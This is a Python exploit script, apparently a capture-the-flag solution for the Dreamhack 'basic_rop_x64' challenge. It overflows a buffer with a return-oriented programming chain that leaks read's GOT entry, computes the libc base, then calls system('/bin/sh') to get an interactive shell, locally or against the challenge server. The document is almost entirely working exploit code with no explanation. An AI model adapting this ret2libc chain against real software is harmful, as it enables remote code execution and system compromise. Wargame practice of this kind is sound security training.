#!/usr/bin/python3
from pwncus import *

# context.log_level = 'debug'
exe = context.binary = ELF('./basic_rop_x64_patched', checksec=False)
libc = ELF('./libc.so.6', checksec=False)

def GDB(): gdb.attach(p, gdbscript='''

b*0x0000000000400819 
c
''') if not args.REMOTE else None

p = remote('host3.dreamhack.games',20302 ) if args.REMOTE else process(argv=[exe.path], aslr=False)
set_p(p)
if args.GDB: GDB(); input()

# ===========================================================
#                          EXPLOIT 
# ===========================================================

pop_rdi = 0x0000000000400883
pop_rsi_r15 = 0x0000000000400881
read_plt = exe.plt["read"]
read_got = exe.got["read"]
write_plt = exe.plt["write"]
write_got = exe.got["write"]
main = exe.symbols["main"]

payload = b'A' * 0x48
payload += p64(pop_rdi) + p64(1)
payload += p64(pop_rsi_r15) + p64(read_got) + p64(8)
payload += p64(write_plt)
payload += p64(main)
s(payload)

ru(b'A'*0x40)
leak_libc = u64(rnb(6) + b'\0\0')
libc.address = leak_libc - libc.sym['read']
slog("Libc base", libc.address)
slog("Libc leak",leak_libc)

payload = b'A' * 0x48
payload += p64(pop_rdi) + p64(next(libc.search(b'/bin/sh')))
payload += p64(libc.sym['system'])
s(payload)

interactive()
